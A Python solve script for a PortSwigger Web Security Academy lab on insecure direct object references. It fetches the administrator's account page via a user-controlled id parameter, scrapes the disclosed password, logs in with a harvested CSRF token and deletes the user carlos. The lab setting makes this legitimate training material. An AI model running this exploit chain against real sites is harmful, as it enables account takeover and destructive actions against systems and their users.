##############################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: User ID controlled by request parameter with password disclosure
#
# Steps: 1. Fetch administrator page via URL id parameter
#        2. Extract the password from source code
#        3. Login as administrator
#        4. Delete carlos
#
##############################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0ac4001604e168cb83168747007f007d.web-security-academy.net"

try:  
    # fetch administrator profile
    admin_profile = requests.get(f"{url}/my-account?id=administrator")
    
except:
    print(Fore.RED + "[!] Failed to fetch administrator profile through exception")
    exit(1)

print(Fore.WHITE + "1. Fetching administrator profile page.. " + Fore.GREEN + "OK")

# extract the administrator password from source code
admin_pass = re.findall("name=password value='(.*)'", admin_profile.text)[0]

print(Fore.WHITE + "2. Extracting password from source code.. " + Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_pass)

try:  
    # fetch the login page to get valid session and csrf token
    get_login = requests.get(f"{url}/login")
    
except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1)

print(Fore.WHITE + "3. Fetching login page to get valid session and csrf token.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]

# set credentials
data = {
    "username": "administrator",
    "password": admin_pass,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:  
    # login as administrator
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as administrator through exception")
    exit(1)

# if you logged in successfully
if login.status_code == 302:
    print(Fore.WHITE + "4. Logging in as administrator.. " + Fore.GREEN + "OK")
    
    # get the new session
    new_session = login.cookies.get("session")
    
    # set session cookie
    cookies = {
        "session": new_session
    }
    
    try:  
        # delete carlos
        delete_carlos = requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
        
    except:
        print(Fore.RED + "[!] Failed to delete carlos through exception")
        exit(1)

    print(Fore.WHITE + "5. Deleting carlos.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
        
else:
    print(Fore.RED + "[!] Failed to login as administrator")
    
